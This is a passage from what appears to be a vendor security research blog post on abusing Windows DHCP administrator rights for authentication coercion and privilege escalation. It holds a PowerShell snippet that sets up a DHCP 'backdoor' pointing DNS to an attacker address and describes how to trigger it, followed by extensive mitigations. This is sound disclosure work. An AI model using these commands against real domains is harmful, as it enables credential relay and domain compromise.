          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig13.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Our backdoor (Figure 13) will consist of 2 scopes."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 13: DHCP backdoor design</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-44b809aaad&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:47:22Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The following PowerShell code shows how these scopes could be created:&lt;/p>\r\n&#34;}}">
    <p>The following PowerShell code shows how these scopes could be created:</p>

</div>

    

</div>
<div class="prismjs aem-GridColumn aem-GridColumn--default--12">
<pre data-cmp-is="prismjs" class="cmp-prismjs lang-bash" data-cmp-data-layer="{&#34;prismjs-3f818d3482&#34;:{&#34;@type&#34;:&#34;akamai/components/prismjs&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:32:42Z&#34;}}">
  <code data-cmp-hook-prismjs="code" class="lang-bash">Import-Module DhcpServer

  Add-DhcpServerv4Scope -StartRange &lt;attacker_ip&gt; -EndRange &lt;attacker_ip&gt; -Name &#34; &#34; -SubnetMask &lt;mask&gt;
  Add-DhcpServerv4Scope -StartRange &lt;coercion_scope_address&gt; -EndRange &lt;coercion_scope_address&gt; -Name &#34; &#34; -SubnetMask &lt;mask&gt;
  Set-DhcpServerv4OptionValue -OptionId 6 -Value &lt;attacker_ip&gt; -Force -ScopeId &lt;coercion_scope_address&gt;</code>
</pre>
<button data-cmp-hook-prismjs="copy" class="cmp-prismjs__copy">Copy</button>


    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-69cb47a3a8&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:34:11Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>To trigger the backdoor, we lease an address from the DHCP server with the following adjustments:&lt;/p>\r\n&lt;ul>\r\n&lt;li>&lt;p>We use our IP address in the relay agent IP address (&lt;i>giaddr&lt;/i>) DHCP field. This field is used to inform the DHCP server of the relay agent IP address. This IP is required to be inside the “authorization scope.”&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>We include the Relay Agent Information option, with an IP address inside the “coercion scope.”&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&lt;p>In Figure 14, our authorization scope includes the IP address 172.25.14.18, and our coercion scope includes the address 66.66.66.66.&lt;/p>\r\n&#34;}}">
    <p>To trigger the backdoor, we lease an address from the DHCP server with the following adjustments:</p>
<ul>
<li><p>We use our IP address in the relay agent IP address (<i>giaddr</i>) DHCP field. This field is used to inform the DHCP server of the relay agent IP address. This IP is required to be inside the “authorization scope.”</p>
</li>
<li><p>We include the Relay Agent Information option, with an IP address inside the “coercion scope.”</p>
</li>
</ul>
<p>In Figure 14, our authorization scope includes the IP address 172.25.14.18, and our coercion scope includes the address 66.66.66.66.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">

      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig14.jpg" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="In Figure 14, our authorization scope includes the IP address 172.25.14.18, and our coercion scope includes the address 66.66.66.66."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 14: DHCP Discover adjustments when acting as a relay agent</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-ec574e43fc&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:50:12Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>We added relay agent support to &lt;a href=\&#34;https://github.com/akamai/DDSpoof\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>DDSpoof&lt;/a>, our &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/weaponizing-dhcp-dns-spoofing-hands-on-guide.html\&#34; target=\&#34;_self\&#34;>DHCP DNS spoofing toolkit&lt;/a>, and created a proof of concept script called &lt;i>dhcp_coerce.py&lt;/i> that enables the performance of this attack. The script acts as a DHCP relay agent and requests an IP address from our requested scope, enabling us to trigger authentication coercion through our coercion scope (Figure 15).&lt;/p>\r\n&#34;}}">
    <p>We added relay agent support to <a href="https://github.com/akamai/DDSpoof" target="_blank" rel="nofollow noreferrer">DDSpoof</a>, our <a href="/blog/security-research/weaponizing-dhcp-dns-spoofing-hands-on-guide" target="_self">DHCP DNS spoofing toolkit</a>, and created a proof of concept script called <i>dhcp_coerce.py</i> that enables the performance of this attack. The script acts as a DHCP relay agent and requests an IP address from our requested scope, enabling us to trigger authentication coercion through our coercion scope (Figure 15).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="The script acts as a DHCP relay agent and requests an IP address from our requested scope, enabling us to trigger the backdoor (Figure 15)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-4132a8817b&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:10:01Z&#34;,&#34;dc:title&#34;:&#34;The script acts as a DHCP relay agent and requests an IP address from our requested scope, enabling us to trigger the backdoor (Figure 15).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;eb5281c6-67d1-469c-aee3-c3a9e5fff003&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:40:06Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig15.png&#34;}}}">

<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="mitigations" data-cmp-data-layer="{&#34;mitigations&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T03:10:39Z&#34;,&#34;dc:title&#34;:&#34;Mitigations&lt;br />\r\n&#34;}}">
    
      <h2 class="cmp-title__text">Mitigations<br />
</h2>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-3fa9519ef5&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:51:06Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Defensive measures against this threat include:&lt;/p>\r\n&lt;ul>\r\n&lt;li>&lt;p>Identifying risky DHCP configuration&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Mitigating relay attacks against AD CS&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Practicing DHCP administrators group hygiene&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Using segmentation to reduce the attack surface&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Identifying DNS anomalies&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&#34;}}">
    <p>Defensive measures against this threat include:</p>
<ul>
<li><p>Identifying risky DHCP configuration</p>
</li>
<li><p>Mitigating relay attacks against AD CS </p>
</li>
<li><p>Practicing DHCP administrators group hygiene</p>
</li>
<li><p>Using segmentation to reduce the attack surface</p>
</li>
<li><p>Identifying DNS anomalies</p>
</li>
</ul>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-b2dc651c3b" data-cmp-data-layer="{&#34;title-b2dc651c3b&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:51:56Z&#34;,&#34;dc:title&#34;:&#34;Identifying risky DHCP configuration&lt;br>\r\n&#34;}}">
    
      <h3 class="cmp-title__text">Identifying risky DHCP configuration<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-356c465470&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:53:09Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>&lt;a href=\&#34;https://github.com/akamai/Invoke-DHCPCheckup\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>Invoke-DHCPCheckup.ps1&lt;/a> can help you identify risky DHCP configuration. The most severe risk in the context of the DHCP coerce attack chain is an installation of a DHCP server on a DC — a configuration that we recommend you avoid.&lt;/p>\r\n&lt;p>Run Invoke-DHCPCheckup to list all active Microsoft DHCP servers, and identify any that are installed on DCs (Figure 16). If possible, disable the DHCP server service on all DCs.&lt;/p>\r\n&#34;}}">
    <p><a href="https://github.com/akamai/Invoke-DHCPCheckup" target="_blank" rel="nofollow noreferrer">Invoke-DHCPCheckup.ps1</a> can help you identify risky DHCP configuration. The most severe risk in the context of the DHCP coerce attack chain is an installation of a DHCP server on a DC — a configuration that we recommend you avoid.</p>
<p>Run Invoke-DHCPCheckup to list all active Microsoft DHCP servers, and identify any that are installed on DCs (Figure 16). If possible, disable the DHCP server service on all DCs.</p>

</div>

    

</div>
<div class="image aem-GridColumn--default--none aem-GridColumn--default--9 aem-GridColumn aem-GridColumn--offset--default--0">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="Run Invoke-DHCPCheckup to list all active Microsoft DHCP servers, and identify any that are installed on DCs (Figure 16)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-b1c854b6de&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:56:14Z&#34;,&#34;dc:title&#34;:&#34;Run Invoke-DHCPCheckup to list all active Microsoft DHCP servers, and identify any that are installed on DCs (Figure 16).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;f54b07a5-a202-4400-911d-dc9a61c14a02&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:55:51Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-invoke-dhcp.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-invoke-dhcp.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="Run Invoke-DHCPCheckup to list all active Microsoft DHCP servers, and identify any that are installed on DCs (Figure 16)."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 16: Identifying a DHCP server installed on a DC using Invoke-DHCPCheckup</span>
    
    
  </div>
</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-2f93ca9c54" data-cmp-data-layer="{&#34;title-2f93ca9c54&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:56:51Z&#34;,&#34;dc:title&#34;:&#34;Mitigating relay attacks against AD CS&lt;br>\r\n&#34;}}">
    
      <h3 class="cmp-title__text">Mitigating relay attacks against AD CS<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-7887d45994&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:57:31Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The most effective way to prevent this attack chain is to mitigate relay attacks against AD CS servers, which would thwart the ability to abuse the authentication coercion primitive.&lt;/p>\r\n&lt;p>The risk of relay attacks and the variation against AD CS are not new, and are known to Microsoft. &lt;a href=\&#34;https://msrc.microsoft.com/blog/2009/12/extended-protection-for-authentication/\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>Extended Protection for Authentication (EPA)&lt;/a> is a feature that was introduced to prevent such attacks, but is not enabled by default for AD CS. To mitigate the risk of relay attacks to AD CS, disable HTTP and &lt;a href=\&#34;https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429#:~:text=Enrollment%20Web%20Service-,Mitigation,-If%20your%20environment\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>enable the EPA feature on all AD CS servers&lt;/a>.&lt;/p>\r\n&#34;}}">
    <p>The most effective way to prevent this attack chain is to mitigate relay attacks against AD CS servers, which would thwart the ability to abuse the authentication coercion primitive.</p>
<p>The risk of relay attacks and the variation against AD CS are not new, and are known to Microsoft. <a href="https://msrc.microsoft.com/blog/2009/12/extended-protection-for-authentication/" target="_blank" rel="nofollow noreferrer">Extended Protection for Authentication (EPA)</a> is a feature that was introduced to prevent such attacks, but is not enabled by default for AD CS. To mitigate the risk of relay attacks to AD CS, disable HTTP and <a href="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429#:~:text=Enrollment%20Web%20Service-,Mitigation,-If%20your%20environment" target="_blank" rel="nofollow noreferrer">enable the EPA feature on all AD CS servers</a>.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-9f463bb426" data-cmp-data-layer="{&#34;title-9f463bb426&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:59:50Z&#34;,&#34;dc:title&#34;:&#34;Practicing DHCP administrators group hygiene&lt;br />\r\n&#34;}}">
    
      <h3 class="cmp-title__text">Practicing DHCP administrators group hygiene<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-9dfbb8d073&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:59:45Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Members of the DHCP administrators group can potentially compromise DHCP clients and servers, so this group should be treated as a high-value asset and monitored accordingly. Limit membership of the DHCP administrators group as much as possible to reduce the risk of an administrator user compromise. &lt;b>Consider using the more limited &lt;i>DHCP&lt;/i> users group in applicable cases&lt;/b>.&lt;/p>\r\n&#34;}}">
    <p>Members of the DHCP administrators group can potentially compromise DHCP clients and servers, so this group should be treated as a high-value asset and monitored accordingly. Limit membership of the DHCP administrators group as much as possible to reduce the risk of an administrator user compromise. <b>Consider using the more limited <i>DHCP</i> users group in applicable cases</b>.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-ffc47d71ab" data-cmp-data-layer="{&#34;title-ffc47d71ab&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:00:15Z&#34;,&#34;dc:title&#34;:&#34;Using segmentation to reduce the attack surface&lt;br />\r\n&#34;}}">
    
      <h3 class="cmp-title__text">Using segmentation to reduce the attack surface<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-e395d39c71&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:02:44Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>In addition to the previous defensive measures, network segmentation could be used to mitigate the attack and reduce the attack surface, potentially preventing potential similar attacks.&lt;/p>\r\n&lt;p>By using &lt;a href=\&#34;/content/akamai/en/products/akamai-guardicore-segmentation.html\&#34; target=\&#34;_self\&#34;>Akamai Guardicore Segmentation&lt;/a>, defenders can:&lt;/p>\r\n&lt;ul>\r\n&lt;li>&lt;p>&lt;a href=\&#34;/content/akamai/en/blog/security-research/segmentation-from-a-practical-perspective.html\&#34; target=\&#34;_self\&#34;>Block RPC traffic to DHCP servers&lt;/a> from nonadministrator endpoints, preventing the ability to modify DHCP options: Create a label that contains the endpoints used by DHCP administrators, then allow only this label to communicate with DHCP servers over non-DHCP ports.&amp;nbsp;&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Block access to AD CS enrollment servers for endpoints that do not require it, which reduces the ability to perform relay attacks: Create a label that contains endpoints that require issuing certificates using AD CS, then allow only this label to communicate with the web enrollment servers.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Block DHCP traffic to and from the internet, preventing external machines’ ability to coerce DHCP authentication: Create a label for all DHCP servers, then block all communication with internet addresses.&lt;/p>\r\n&lt;/li>\r\n&lt;/ul>\r\n&#34;}}">
    <p>In addition to the previous defensive measures, network segmentation could be used to mitigate the attack and reduce the attack surface, potentially preventing potential similar attacks.</p>
<p>By using <a href="/products/akamai-guardicore-segmentation" target="_self">Akamai Guardicore Segmentation</a>, defenders can:</p>
<ul>
<li><p><a href="/blog/security-research/segmentation-from-a-practical-perspective" target="_self">Block RPC traffic to DHCP servers</a> from nonadministrator endpoints, preventing the ability to modify DHCP options: Create a label that contains the endpoints used by DHCP administrators, then allow only this label to communicate with DHCP servers over non-DHCP ports. </p>
</li>
<li><p>Block access to AD CS enrollment servers for endpoints that do not require it, which reduces the ability to perform relay attacks: Create a label that contains endpoints that require issuing certificates using AD CS, then allow only this label to communicate with the web enrollment servers.</p>
</li>
<li><p>Block DHCP traffic to and from the internet, preventing external machines’ ability to coerce DHCP authentication: Create a label for all DHCP servers, then block all communication with internet addresses.</p>
</li>
</ul>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-389180cb8c" data-cmp-data-layer="{&#34;title-389180cb8c&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:50:33Z&#34;,&#34;dc:title&#34;:&#34;Identifying DNS anomalies&lt;br>\r\n&#34;}}">
    
      <h3 class="cmp-title__text">Identifying DNS anomalies<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-8409d58775&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:04:24Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The attack relies on forcing the DHCP server to send a DNS update request to an address that’s different from the standard AD DNS server. This type of traffic is usually static in nature, so this behavior is highly anomalous. This anomalous traffic behavior can serve as a detection opportunity for this attack, or any other attack that abuses Kerberos authentication over DNS.&lt;/p>\r\n&lt;p>To identify such anomalies, create a list of legitimate DNS servers that should be receiving DNS updates — either by querying AD or by monitoring DNS traffic. This list should be fairly limited and it should be used as a baseline for legitimate traffic. Any deviation from this list should be investigated — especially if it involves internet addresses.&lt;/p>\r\n&lt;p>&lt;a href=\&#34;/content/akamai/en/products/hunt.html\&#34; target=\&#34;_self\&#34;>Akamai Hunt&lt;/a>, Akamai’s managed threat hunting service, offers its customers protection in the form of a large set of anomaly detection techniques that constantly monitor the environment in an attempt to detect the unknown.&lt;/p>\r\n&#34;}}">
    <p>The attack relies on forcing the DHCP server to send a DNS update request to an address that’s different from the standard AD DNS server. This type of traffic is usually static in nature, so this behavior is highly anomalous. This anomalous traffic behavior can serve as a detection opportunity for this attack, or any other attack that abuses Kerberos authentication over DNS.</p>
<p>To identify such anomalies, create a list of legitimate DNS servers that should be receiving DNS updates — either by querying AD or by monitoring DNS traffic. This list should be fairly limited and it should be used as a baseline for legitimate traffic. Any deviation from this list should be investigated — especially if it involves internet addresses.</p>
<p><a href="/products/hunt" target="_self">Akamai Hunt</a>, Akamai’s managed threat hunting service, offers its customers protection in the form of a large set of anomaly detection techniques that constantly monitor the environment in an attempt to detect the unknown.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-833abefdab" data-cmp-data-layer="{&#34;title-833abefdab&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:52:34Z&#34;,&#34;dc:title&#34;:&#34;Conclusion&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">Conclusion<br />
</h2>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-95b68a555f&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:05:02Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>Malicious privilege escalation can be disastrous, especially when it leverages legitimate processes. Juggling strong security controls with minimal inconvenience to the user presents a major quandary for the modern security professional. With the introduction of the Internet of Things, a distributed mobile workforce, and the constant onslaught of both new and old vulnerability exploitation, there has never been a more critical time to get a handle on your access strategy.&lt;/p>\r\n&lt;p>The DHCP administrators group is a striking example of this concept. It provides its members with a strong set of permissions, but those permissions may also be abused by attackers. Especially in security, even the most well-intentioned features can be abused.&lt;/p>\r\n&lt;p>Defenders should be aware of this potential risk, and treat this group with the appropriate caution. We hope this post has provided context and defensive measures against this threat.&lt;/p>\r\n&#34;}}">
    <p>Malicious privilege escalation can be disastrous, especially when it leverages legitimate processes. Juggling strong security controls with minimal inconvenience to the user presents a major quandary for the modern security professional. With the introduction of the Internet of Things, a distributed mobile workforce, and the constant onslaught of both new and old vulnerability exploitation, there has never been a more critical time to get a handle on your access strategy.</p>
<p>The DHCP administrators group is a striking example of this concept. It provides its members with a strong set of permissions, but those permissions may also be abused by attackers. Especially in security, even the most well-intentioned features can be abused.</p>
<p>Defenders should be aware of this potential risk, and treat this group with the appropriate caution. We hope this post has provided context and defensive measures against this threat.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-4431e59bd1" data-cmp-data-layer="{&#34;title-4431e59bd1&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:53:38Z&#34;,&#34;dc:title&#34;:&#34;Learn more&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">Learn more<br />
</h2>
    
</div>

    


</div>
<div class="text text__pb-20 aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-7d6fa3d850&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:07:30Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>For additional information about risks related to Microsoft DHCP, please refer to our other blog posts on the subject:&lt;/p>\r\n&lt;p>&lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/spoofing-dns-by-abusing-dhcp.html\&#34; target=\&#34;_self\&#34;>Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates&lt;/a>&lt;/p>\r\n&lt;p>&lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/weaponizing-dhcp-dns-spoofing-hands-on-guide.html\&#34; target=\&#34;_self\&#34;>Weaponizing DHCP DNS Spoofing — A Hands-On Guide&lt;/a>&lt;/p>\r\n&lt;p>&lt;br>\r\nThe Akamai Security Intelligence Group will continue to monitor this threat and others like it and publish our findings. To keep up with DHCP updates and other security research, you can &lt;a href=\&#34;https://twitter.com/akamai_research\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>follow us on X&lt;/a> (formerly Twitter).&lt;/p>\r\n&#34;}}">
    <p>For additional information about risks related to Microsoft DHCP, please refer to our other blog posts on the subject:</p>
<p><a href="/blog/security-research/spoofing-dns-by-abusing-dhcp" target="_self">Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates</a></p>
<p><a href="/blog/security-research/weaponizing-dhcp-dns-spoofing-hands-on-guide" target="_self">Weaponizing DHCP DNS Spoofing — A Hands-On Guide</a></p>
<p><br />
The Akamai Security Intelligence Group will continue to monitor this threat and others like it and publish our findings. To keep up with DHCP updates and other security research, you can <a href="https://twitter.com/akamai_research" target="_blank" rel="nofollow noreferrer">follow us on X</a> (formerly Twitter).</p>

</div>
